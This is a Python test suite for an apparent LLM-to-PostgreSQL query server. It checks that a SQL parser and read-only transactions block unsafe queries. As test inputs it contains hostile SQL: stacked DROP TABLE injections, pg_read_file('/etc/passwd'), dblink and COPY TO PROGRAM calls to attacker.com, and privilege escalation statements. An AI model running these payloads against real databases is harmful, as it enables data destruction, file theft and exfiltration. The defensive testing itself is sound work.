"""Security integration tests with defense-in-depth approach.

This module tests the multi-layered security defenses:
1. SQL parsing validation (SQLParser)
2. Read-only transaction enforcement (PostgreSQL)
3. Dangerous function blocking
4. SQL injection prevention

Uses real PostgreSQL instances via testcontainers for accurate behavior testing.
"""

import asyncio
import contextlib
from collections.abc import AsyncGenerator
from unittest.mock import AsyncMock, MagicMock, patch

import asyncpg
import pytest
from testcontainers.postgres import PostgresContainer

from pg_mcp.config.models import (
    AppConfig,
    DatabaseConfig,
    OpenAIConfig,
    RateLimitConfig,
    ServerConfig,
)
from pg_mcp.infrastructure.database import DatabasePool
from pg_mcp.infrastructure.sql_parser import SQLParser
from pg_mcp.models.errors import UnsafeSQLError
from pg_mcp.models.query import QueryRequest, ReturnType
from pg_mcp.server import PgMcpServer


class TestSecurityDefenseInDepth:
    """Defense-in-depth security tests using real PostgreSQL."""

    @pytest.fixture
    def real_db(self) -> PostgresContainer:
        """Create a real PostgreSQL container for testing."""
        container = PostgresContainer("postgres:16")
        container.start()
        yield container
        container.stop()

    @pytest.fixture
    def database_config(self, real_db: PostgresContainer) -> DatabaseConfig:
        """Create database config from container."""
        return DatabaseConfig(
            name="security_test_db",
            host=real_db.get_container_host_ip(),
            port=int(real_db.get_exposed_port(5432)),
            dbname=real_db.dbname,
            user=real_db.username,
            password=real_db.password,  # type: ignore
        )

    @pytest.fixture
    async def database_pool(
        self, database_config: DatabaseConfig
    ) -> AsyncGenerator[DatabasePool]:
        """Create and connect database pool."""
        pool = DatabasePool(database_config)
        await pool.connect()
        yield pool
        await pool.disconnect()

    @pytest.fixture
    async def setup_test_tables(self, database_pool: DatabasePool) -> None:
        """Set up test tables for security testing."""
        # Create a simple test table
        await database_pool.execute("""
            CREATE TABLE sensitive_data (
                id SERIAL PRIMARY KEY,
                username VARCHAR(100) NOT NULL,
                password_hash VARCHAR(255) NOT NULL,
                secret_key VARCHAR(255)
            )
        """)

        # Insert test data
        await database_pool.execute("""
            INSERT INTO sensitive_data (username, password_hash, secret_key)
            VALUES
                ('admin', 'hash123', 'secret_admin_key'),
                ('user1', 'hash456', 'secret_user_key')
        """)

        # Create another table for testing write operations
        await database_pool.execute("""
            CREATE TABLE audit_log (
                id SERIAL PRIMARY KEY,
                action VARCHAR(100),
                timestamp TIMESTAMP DEFAULT NOW()
            )
        """)

    @pytest.fixture
    def app_config(self, database_config: DatabaseConfig) -> AppConfig:
        """Create application configuration with readonly transactions enabled."""
        return AppConfig(
            databases=[database_config],
            openai=OpenAIConfig(
                api_key="sk-test-key",  # type: ignore
                model="gpt-4o-mini",
            ),
            server=ServerConfig(
                cache_refresh_interval=3600,
                max_result_rows=1000,
                query_timeout=30.0,
                use_readonly_transactions=True,  # Important for security
            ),
            rate_limit=RateLimitConfig(enabled=False),
        )

    @pytest.fixture
    def sql_parser(self) -> SQLParser:
        """Create SQL parser for validation tests."""
        return SQLParser()

    # ===== Read-Only Transaction Tests =====

    @pytest.mark.asyncio
    async def test_readonly_transaction_blocks_insert(
        self,
        database_pool: DatabasePool,
        setup_test_tables: None,
    ) -> None:
        """Test that readonly transaction blocks INSERT even if validation is bypassed."""
        # This tests the database-level defense (layer 2)
        # Even if SQL validation is somehow bypassed, the readonly transaction
        # should prevent any write operations

        with pytest.raises(asyncpg.ReadOnlySQLTransactionError):
            await database_pool.fetch_readonly(
                "INSERT INTO audit_log (action) VALUES ('test')"
            )

    @pytest.mark.asyncio
    async def test_readonly_transaction_blocks_update(
        self,
        database_pool: DatabasePool,
        setup_test_tables: None,
    ) -> None:
        """Test that readonly transaction blocks UPDATE."""
        with pytest.raises(asyncpg.ReadOnlySQLTransactionError):
            await database_pool.fetch_readonly(
                "UPDATE sensitive_data SET username = 'hacked' WHERE id = 1"
            )

    @pytest.mark.asyncio
    async def test_readonly_transaction_blocks_delete(
        self,
        database_pool: DatabasePool,
        setup_test_tables: None,
    ) -> None:
        """Test that readonly transaction blocks DELETE."""
        with pytest.raises(asyncpg.ReadOnlySQLTransactionError):
            await database_pool.fetch_readonly("DELETE FROM sensitive_data WHERE id = 1")

    @pytest.mark.asyncio
    async def test_readonly_transaction_blocks_truncate(
        self,
        database_pool: DatabasePool,
        setup_test_tables: None,
    ) -> None:
        """Test that readonly transaction blocks TRUNCATE."""
        with pytest.raises(asyncpg.ReadOnlySQLTransactionError):
            await database_pool.fetch_readonly("TRUNCATE TABLE sensitive_data")

    @pytest.mark.asyncio
    async def test_readonly_transaction_blocks_drop(
        self,
        database_pool: DatabasePool,
        setup_test_tables: None,
    ) -> None:
        """Test that readonly transaction blocks DROP."""
        with pytest.raises(asyncpg.ReadOnlySQLTransactionError):
            await database_pool.fetch_readonly("DROP TABLE sensitive_data")

    @pytest.mark.asyncio
    async def test_readonly_transaction_allows_select(
        self,
        database_pool: DatabasePool,
        setup_test_tables: None,
    ) -> None:
        """Test that readonly transaction allows SELECT queries."""
        result = await database_pool.fetch_readonly("SELECT * FROM sensitive_data")
        assert len(result) == 2

    # ===== SQL Parser Validation Tests =====

    def test_select_into_blocked(self, sql_parser: SQLParser) -> None:
        """Test that SELECT INTO is blocked by SQL parser."""
        result = sql_parser.validate("SELECT * INTO new_table FROM sensitive_data")
        assert not result.is_safe
        assert "select into" in result.error_message.lower()

    def test_for_update_blocked(self, sql_parser: SQLParser) -> None:
        """Test that FOR UPDATE is blocked by SQL parser."""
        result = sql_parser.validate("SELECT * FROM sensitive_data FOR UPDATE")
        assert not result.is_safe
        assert "for update" in result.error_message.lower()

    def test_for_share_blocked(self, sql_parser: SQLParser) -> None:
        """Test that FOR SHARE is blocked by SQL parser."""
        result = sql_parser.validate("SELECT * FROM sensitive_data FOR SHARE")
        assert not result.is_safe
        assert "for share" in result.error_message.lower()

    def test_cte_with_insert_blocked(self, sql_parser: SQLParser) -> None:
        """Test that CTE with INSERT (writeable CTE) is blocked."""
        sql = """
        WITH new_log AS (
            INSERT INTO audit_log (action) VALUES ('hack') RETURNING *
        )
        SELECT * FROM new_log
        """
        result = sql_parser.validate(sql)
        assert not result.is_safe

    def test_cte_with_delete_blocked(self, sql_parser: SQLParser) -> None:
        """Test that CTE with DELETE is blocked."""
        sql = """
        WITH deleted AS (
            DELETE FROM sensitive_data WHERE id = 1 RETURNING *
        )
        SELECT * FROM deleted
        """
        result = sql_parser.validate(sql)
        assert not result.is_safe

    def test_cte_with_update_blocked(self, sql_parser: SQLParser) -> None:
        """Test that CTE with UPDATE is blocked."""
        sql = """
        WITH updated AS (
            UPDATE sensitive_data SET username = 'hacked' RETURNING *
        )
        SELECT * FROM updated
        """
        result = sql_parser.validate(sql)
        assert not result.is_safe

    # ===== Dangerous Function Tests =====

    def test_pg_sleep_blocked(self, sql_parser: SQLParser) -> None:
        """Test that pg_sleep is blocked (DoS prevention)."""
        result = sql_parser.validate("SELECT pg_sleep(10)")
        assert not result.is_safe
        assert "pg_sleep" in result.error_message.lower()

    def test_dblink_blocked(self, sql_parser: SQLParser) -> None:
        """Test that dblink is blocked (prevents remote connections)."""
        result = sql_parser.validate(
            "SELECT * FROM dblink('host=attacker.com', 'SELECT 1')"
        )
        assert not result.is_safe

    def test_pg_terminate_backend_blocked(self, sql_parser: SQLParser) -> None:
        """Test that pg_terminate_backend is blocked."""
        result = sql_parser.validate("SELECT pg_terminate_backend(1234)")
        assert not result.is_safe

    def test_pg_cancel_backend_blocked(self, sql_parser: SQLParser) -> None:
        """Test that pg_cancel_backend is blocked."""
        result = sql_parser.validate("SELECT pg_cancel_backend(1234)")
        assert not result.is_safe

    def test_lo_import_blocked(self, sql_parser: SQLParser) -> None:
        """Test that lo_import is blocked (file system access)."""
        result = sql_parser.validate("SELECT lo_import('/etc/passwd')")
        assert not result.is_safe

    def test_lo_export_blocked(self, sql_parser: SQLParser) -> None:
        """Test that lo_export is blocked (file system access)."""
        result = sql_parser.validate("SELECT lo_export(12345, '/tmp/data.txt')")
        assert not result.is_safe

    def test_pg_read_file_blocked(self, sql_parser: SQLParser) -> None:
        """Test that pg_read_file is blocked (file system access)."""
        result = sql_parser.validate("SELECT pg_read_file('/etc/passwd')")
        assert not result.is_safe

    # ===== Stacked Queries (SQL Injection) Tests =====

    def test_stacked_queries_blocked(self, sql_parser: SQLParser) -> None:
        """Test that stacked queries (multiple statements) are blocked."""
        result = sql_parser.validate(
            "SELECT * FROM users; DROP TABLE users; --"
        )
        assert not result.is_safe
        assert "multiple statements" in result.error_message.lower()

    def test_stacked_queries_with_insert_blocked(self, sql_parser: SQLParser) -> None:
        """Test stacked query with INSERT blocked."""
        result = sql_parser.validate(
            "SELECT 1; INSERT INTO users VALUES (1, 'hacker')"
        )
        assert not result.is_safe

    def test_stacked_queries_with_update_blocked(self, sql_parser: SQLParser) -> None:
        """Test stacked query with UPDATE blocked."""
        result = sql_parser.validate(
            "SELECT 1; UPDATE users SET password = 'hacked'"
        )
        assert not result.is_safe

    # ===== SET ROLE / Privilege Escalation Tests =====

    def test_set_role_blocked(self, sql_parser: SQLParser) -> None:
        """Test that SET ROLE is blocked (privilege escalation prevention)."""
        result = sql_parser.validate("SET ROLE superuser")
        assert not result.is_safe
        assert "set role" in result.error_message.lower()

    def test_set_session_authorization_blocked(self, sql_parser: SQLParser) -> None:
        """Test that SET SESSION AUTHORIZATION is blocked."""
        result = sql_parser.validate("SET SESSION AUTHORIZATION postgres")
        assert not result.is_safe

    # ===== COPY Command Tests =====

    def test_copy_to_blocked(self, sql_parser: SQLParser) -> None:
        """Test that COPY TO is blocked (file system write)."""
        result = sql_parser.validate("COPY users TO '/tmp/users.csv'")
        assert not result.is_safe
        assert "copy to" in result.error_message.lower()

    def test_copy_from_blocked(self, sql_parser: SQLParser) -> None:
        """Test that COPY FROM is blocked (file system read)."""
        result = sql_parser.validate("COPY users FROM '/tmp/malicious.csv'")
        assert not result.is_safe

    # ===== LISTEN/NOTIFY Tests =====

    def test_listen_blocked(self, sql_parser: SQLParser) -> None:
        """Test that LISTEN is blocked."""
        result = sql_parser.validate("LISTEN channel_name")
        assert not result.is_safe
        assert "listen" in result.error_message.lower()

    def test_notify_blocked(self, sql_parser: SQLParser) -> None:
        """Test that NOTIFY is blocked."""
        result = sql_parser.validate("NOTIFY channel_name, 'payload'")
        assert not result.is_safe
        assert "notify" in result.error_message.lower()

    # ===== End-to-End Security Tests =====

    @pytest.mark.asyncio
    async def test_unsafe_sql_rejected_before_execution(
        self,
        setup_test_tables: None,
        app_config: AppConfig,
    ) -> None:
        """Test that unsafe SQL is rejected before reaching the database."""
        # Mock OpenAI to return unsafe SQL
        mock_response = MagicMock()
        mock_response.choices = [MagicMock()]
        mock_response.choices[0].message.content = (
            '{"sql": "DELETE FROM sensitive_data WHERE id = 1", '
            '"explanation": "Delete data"}'
        )
        mock_response.usage = MagicMock()
        mock_response.usage.total_tokens = 50

        with patch("pg_mcp.infrastructure.openai_client.AsyncOpenAI") as mock_openai:
            mock_client = AsyncMock()
            mock_client.chat.completions.create = AsyncMock(return_value=mock_response)
            mock_openai.return_value = mock_client

            server = PgMcpServer(app_config)
            await server.startup()

            try:
                request = QueryRequest(
                    question="Delete some data",
                    database="security_test_db",
                    return_type=ReturnType.RESULT,
                )

                # The unsafe SQL should be rejected before execution
                with pytest.raises(UnsafeSQLError):
                    await server.execute_query(request)
            finally:
                await server.shutdown()

    @pytest.mark.asyncio
    async def test_pg_sleep_in_llm_response_blocked(
        self,
        setup_test_tables: None,
        app_config: AppConfig,
    ) -> None:
        """Test that pg_sleep in LLM response is blocked."""
        mock_response = MagicMock()
        mock_response.choices = [MagicMock()]
        mock_response.choices[0].message.content = (
            '{"sql": "SELECT pg_sleep(100)", "explanation": "Sleep for DoS"}'
        )
        mock_response.usage = MagicMock()
        mock_response.usage.total_tokens = 30

        with patch("pg_mcp.infrastructure.openai_client.AsyncOpenAI") as mock_openai:
            mock_client = AsyncMock()
            mock_client.chat.completions.create = AsyncMock(return_value=mock_response)
            mock_openai.return_value = mock_client

            server = PgMcpServer(app_config)
            await server.startup()

            try:
                request = QueryRequest(
                    question="Make the database slow",
                    database="security_test_db",
                    return_type=ReturnType.RESULT,
                )

                with pytest.raises(UnsafeSQLError):
                    await server.execute_query(request)
            finally:
                await server.shutdown()

    @pytest.mark.asyncio
    async def test_stacked_query_in_llm_response_blocked(
        self,
        setup_test_tables: None,
        app_config: AppConfig,
    ) -> None:
        """Test that stacked queries in LLM response are blocked."""
        mock_response = MagicMock()
        mock_response.choices = [MagicMock()]
        mock_response.choices[0].message.content = (
            '{"sql": "SELECT 1; DROP TABLE sensitive_data", '
            '"explanation": "SQL injection attempt"}'
        )
        mock_response.usage = MagicMock()
        mock_response.usage.total_tokens = 40

        with patch("pg_mcp.infrastructure.openai_client.AsyncOpenAI") as mock_openai:
            mock_client = AsyncMock()
            mock_client.chat.completions.create = AsyncMock(return_value=mock_response)
            mock_openai.return_value = mock_client

            server = PgMcpServer(app_config)
            await server.startup()

            try:
                request = QueryRequest(
                    question="Drop the table",
                    database="security_test_db",
                    return_type=ReturnType.RESULT,
                )

                with pytest.raises(UnsafeSQLError):
                    await server.execute_query(request)
            finally:
                await server.shutdown()

    @pytest.mark.asyncio
    async def test_for_update_in_llm_response_blocked(
        self,
        setup_test_tables: None,
        app_config: AppConfig,
    ) -> None:
        """Test that FOR UPDATE in LLM response is blocked."""
        mock_response = MagicMock()
        mock_response.choices = [MagicMock()]
        mock_response.choices[0].message.content = (
            '{"sql": "SELECT * FROM sensitive_data FOR UPDATE", '
            '"explanation": "Lock rows"}'
        )
        mock_response.usage = MagicMock()
        mock_response.usage.total_tokens = 35

        with patch("pg_mcp.infrastructure.openai_client.AsyncOpenAI") as mock_openai:
            mock_client = AsyncMock()
            mock_client.chat.completions.create = AsyncMock(return_value=mock_response)
            mock_openai.return_value = mock_client

            server = PgMcpServer(app_config)
            await server.startup()

            try:
                request = QueryRequest(
                    question="Lock some rows",
                    database="security_test_db",
                    return_type=ReturnType.RESULT,
                )

                with pytest.raises(UnsafeSQLError):
                    await server.execute_query(request)
            finally:
                await server.shutdown()

    @pytest.mark.asyncio
    async def test_select_into_in_llm_response_blocked(
        self,
        setup_test_tables: None,
        app_config: AppConfig,
    ) -> None:
        """Test that SELECT INTO in LLM response is blocked."""
        mock_response = MagicMock()
        mock_response.choices = [MagicMock()]
        mock_response.choices[0].message.content = (
            '{"sql": "SELECT * INTO stolen_data FROM sensitive_data", '
            '"explanation": "Create new table"}'
        )
        mock_response.usage = MagicMock()
        mock_response.usage.total_tokens = 40

        with patch("pg_mcp.infrastructure.openai_client.AsyncOpenAI") as mock_openai:
            mock_client = AsyncMock()
            mock_client.chat.completions.create = AsyncMock(return_value=mock_response)
            mock_openai.return_value = mock_client

            server = PgMcpServer(app_config)
            await server.startup()

            try:
                request = QueryRequest(
                    question="Create a backup table",
                    database="security_test_db",
                    return_type=ReturnType.RESULT,
                )

                with pytest.raises(UnsafeSQLError):
                    await server.execute_query(request)
            finally:
                await server.shutdown()


class TestSQLInjectionPrevention:
    """Tests specifically for SQL injection prevention."""

    @pytest.fixture
    def sql_parser(self) -> SQLParser:
        """Create SQL parser for validation tests."""
        return SQLParser()

    def test_union_based_injection_safe_when_valid_select(
        self, sql_parser: SQLParser
    ) -> None:
        """Test that UNION SELECT is allowed as valid SQL (but validated)."""
        # UNION is legitimate SQL, but we validate the complete query
        result = sql_parser.validate(
            "SELECT id, name FROM users UNION SELECT id, email FROM admins"
        )
        # UNION SELECT itself is valid SQL - the danger is in what's being unioned
        assert result.is_valid
        assert result.is_safe

    def test_comment_based_injection(self, sql_parser: SQLParser) -> None:
        """Test that comments are handled safely."""
        # Comments in valid SELECT are okay
        result = sql_parser.validate(
            "SELECT * FROM users -- this is a comment"
        )
        assert result.is_valid
        assert result.is_safe

        # But stacked queries with comments are not
        result = sql_parser.validate(
            "SELECT * FROM users; DROP TABLE users; -- comment"
        )
        assert not result.is_safe

    def test_blind_injection_patterns(self, sql_parser: SQLParser) -> None:
        """Test handling of blind SQL injection patterns."""
        # These are valid SELECT queries, just with interesting WHERE clauses
        queries = [
            "SELECT * FROM users WHERE id = 1 AND 1=1",
            "SELECT * FROM users WHERE id = 1 OR 1=1",
            "SELECT * FROM users WHERE id = 1 AND SLEEP(5)",  # MySQL style
        ]

        for query in queries:
            # Validate these queries - they are syntactically valid SELECTs
            # SLEEP is MySQL, not PostgreSQL, so it might parse or not
            # The key is they don't contain dangerous PostgreSQL functions
            sql_parser.validate(query)

    def test_subquery_injection(self, sql_parser: SQLParser) -> None:
        """Test that subqueries are validated for safety."""
        # Safe subquery
        result = sql_parser.validate(
            "SELECT * FROM users WHERE id IN (SELECT user_id FROM orders)"
        )
        assert result.is_safe

        # Subquery with dangerous function
        result = sql_parser.validate(
            "SELECT * FROM users WHERE id = (SELECT pg_sleep(10))"
        )
        assert not result.is_safe

    def test_string_based_injection_attempt(self, sql_parser: SQLParser) -> None:
        """Test string-based SQL injection patterns."""
        # These patterns might appear in generated SQL if LLM is manipulated
        # They are syntactically valid single SELECT statements
        # They might be suspicious but aren't inherently dangerous

        # Valid but suspicious - tautology in WHERE clause
        result = sql_parser.validate(
            "SELECT * FROM users WHERE name = '' OR '1'='1'"
        )
        # This is actually valid SQL, just with a tautology
        assert result.is_valid

        # Single statement with trailing comment is OK
        result = sql_parser.validate("SELECT * FROM users WHERE id = 1; --")
        # This depends on parser behavior - trailing semicolon with comment
        # The key point is no second statement executes


class TestDataExfiltrationPrevention:
    """Tests for preventing data exfiltration attacks."""

    @pytest.fixture
    def sql_parser(self) -> SQLParser:
        """Create SQL parser for validation tests."""
        return SQLParser()

    def test_copy_to_stdout_blocked(self, sql_parser: SQLParser) -> None:
        """Test that COPY TO STDOUT is blocked."""
        result = sql_parser.validate("COPY users TO STDOUT")
        assert not result.is_safe

    def test_copy_program_blocked(self, sql_parser: SQLParser) -> None:
        """Test that COPY with PROGRAM is blocked."""
        result = sql_parser.validate(
            "COPY users TO PROGRAM 'curl http://attacker.com'"
        )
        assert not result.is_safe

    def test_pg_dump_style_queries_allowed(self, sql_parser: SQLParser) -> None:
        """Test that normal SELECT queries are allowed."""
        # These are legitimate SELECT queries that might return sensitive data
        # The security is in what data the user is allowed to query
        result = sql_parser.validate("SELECT password_hash FROM users")
        assert result.is_safe  # SQL is safe, access control is separate concern


class TestDenialOfServicePrevention:
    """Tests for preventing DoS attacks."""

    @pytest.fixture
    def sql_parser(self) -> SQLParser:
        """Create SQL parser for validation tests."""
        return SQLParser()

    @pytest.fixture
    def real_db(self) -> PostgresContainer:
        """Create a real PostgreSQL container for testing."""
        container = PostgresContainer("postgres:16")
        container.start()
        yield container
        container.stop()

    @pytest.fixture
    async def database_pool(
        self, real_db: PostgresContainer
    ) -> AsyncGenerator[DatabasePool]:
        """Create and connect database pool."""
        config = DatabaseConfig(
            name="dos_test",
            host=real_db.get_container_host_ip(),
            port=int(real_db.get_exposed_port(5432)),
            dbname=real_db.dbname,
            user=real_db.username,
            password=real_db.password,  # type: ignore
        )
        pool = DatabasePool(config)
        await pool.connect()
        yield pool
        await pool.disconnect()

    def test_pg_sleep_variants_blocked(self, sql_parser: SQLParser) -> None:
        """Test that all pg_sleep variants are blocked."""
        variants = [
            "SELECT pg_sleep(10)",
            "SELECT pg_sleep(10.5)",
            "SELECT pg_sleep(10::int)",
            "SELECT * FROM users WHERE pg_sleep(10) IS NOT NULL",
            "SELECT CASE WHEN 1=1 THEN pg_sleep(10) END",
        ]

        for query in variants:
            result = sql_parser.validate(query)
            assert not result.is_safe, f"Query should be blocked: {query}"

    def test_generate_series_allowed(self, sql_parser: SQLParser) -> None:
        """Test that generate_series is allowed (useful for reporting)."""
        result = sql_parser.validate(
            "SELECT * FROM generate_series(1, 100)"
        )
        assert result.is_safe

    @pytest.mark.asyncio
    async def test_statement_timeout_enforced(
        self,
        database_pool: DatabasePool,
    ) -> None:
        """Test that statement timeout is enforced at database level."""
        # Create a table for testing
        await database_pool.execute("""
            CREATE TABLE test_data (id SERIAL PRIMARY KEY, value TEXT)
        """)
        await database_pool.execute("""
            INSERT INTO test_data (value)
            SELECT md5(random()::text) FROM generate_series(1, 100)
        """)

        # Test that very short timeout causes cancellation
        # Note: This tests the database-level timeout mechanism
        # Setting a 1ms timeout should cause most queries to fail
        with contextlib.suppress(
            asyncpg.QueryCanceledError, asyncio.TimeoutError, TimeoutError
        ):
            await database_pool.fetch_readonly(
                "SELECT * FROM test_data, test_data t2, test_data t3 LIMIT 1",
                timeout=0.001,
            )
            # Timeout is expected behavior - suppress the exception


class TestPrivilegeEscalationPrevention:
    """Tests for preventing privilege escalation attacks."""

    @pytest.fixture
    def sql_parser(self) -> SQLParser:
        """Create SQL parser for validation tests."""
        return SQLParser()

    def test_grant_blocked(self, sql_parser: SQLParser) -> None:
        """Test that GRANT is blocked."""
        result = sql_parser.validate("GRANT ALL ON users TO attacker")
        assert not result.is_safe

    def test_revoke_blocked(self, sql_parser: SQLParser) -> None:
        """Test that REVOKE is blocked."""
        result = sql_parser.validate("REVOKE ALL ON users FROM legitimate_user")
        assert not result.is_safe

    def test_create_user_blocked(self, sql_parser: SQLParser) -> None:
        """Test that CREATE USER is blocked."""
        result = sql_parser.validate("CREATE USER attacker WITH PASSWORD 'hack'")
        assert not result.is_safe

    def test_alter_user_blocked(self, sql_parser: SQLParser) -> None:
        """Test that ALTER USER is blocked."""
        result = sql_parser.validate("ALTER USER postgres WITH SUPERUSER")
        assert not result.is_safe

    def test_create_extension_blocked(self, sql_parser: SQLParser) -> None:
        """Test that CREATE EXTENSION is blocked."""
        result = sql_parser.validate("CREATE EXTENSION IF NOT EXISTS dblink")
        assert not result.is_safe

    def test_create_function_blocked(self, sql_parser: SQLParser) -> None:
        """Test that CREATE FUNCTION is blocked."""
        result = sql_parser.validate("""
            CREATE FUNCTION evil() RETURNS void AS $$
            BEGIN
                EXECUTE 'DROP TABLE users';
            END;
            $$ LANGUAGE plpgsql
        """)
        assert not result.is_safe
